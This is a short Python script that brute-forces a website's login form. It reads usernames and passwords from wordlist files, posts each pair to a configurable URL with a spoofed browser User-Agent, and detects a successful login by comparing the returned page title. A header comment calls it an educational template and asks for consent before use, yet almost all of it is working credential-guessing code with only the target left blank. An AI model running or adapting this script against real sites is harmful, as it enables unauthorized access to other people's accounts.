# This bruteforce script is a template and it was made for educational purposes only, please don't use this against other people without their actual consent 


# We need requests, bs4 and sys modules for this to work

import requests
from bs4 import BeautifulSoup
import sys

# The title of the page when the login is successful goes here, (to get the title search in the website's html for the tag <title> inside the <head> tag)

page_title = ''
url = ''
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}

def brute(username, password):
    data = {'username' : username, 'password' : password}      
    
    r = requests.post(url, data=data, headers=headers).text
    
    soup = BeautifulSoup(r, 'html.parser')
    if soup.title.text == page_title:
        print('|===========================================================================|')
        print(f"          [+] A match was found with {username} : {password} [+]")
        print('|===========================================================================|')
        print('\n')
        sys.exit()
    else:
        pass

def main():
    user_input = str(input('Type username here if you have one, if not press enter >> ') or 'none')
    
    if user_input == 'none':        
        users = str(input('Specify a file with users >> '))
        passwords = str(input('Specify a file with passwords >> '))
        print('\n')   
        passwords = [w.strip() for w in open(passwords, 'r').readlines()]
        users = [u.strip() for u in open(users, 'r').readlines()]
        user_index = 0
        pass_index = 0
        stop = 0
        
        # stop is a variable that i made so it stops when there are no more usernames, otherwice it would continue and give an IndexError        
        while stop != len(users):        
            brute(users[user_index], passwords[pass_index])        
            print(f'Tried with >> {users[user_index]} : {passwords[pass_index]} \n')        
            pass_index += 1        
            if pass_index == len(passwords):
                stop += 1
                pass_index = 0
                user_index += 1
    else:
        # This else is when the user specified a username        
        passwords = str(input('Specify a folder with passwords >> '))     
        passwords = [w.strip() for w in open(passwords, 'r').readlines()]
        for password in passwords:
            brute(user_input, password)
            print(f'Tried with >> {user_input} : {password} \n')
        
# You will need to adapt this scrip in case it doesn't work for a website, remember all websites are different but the goal is to find a wayso that it detects what a successful login is 

main()
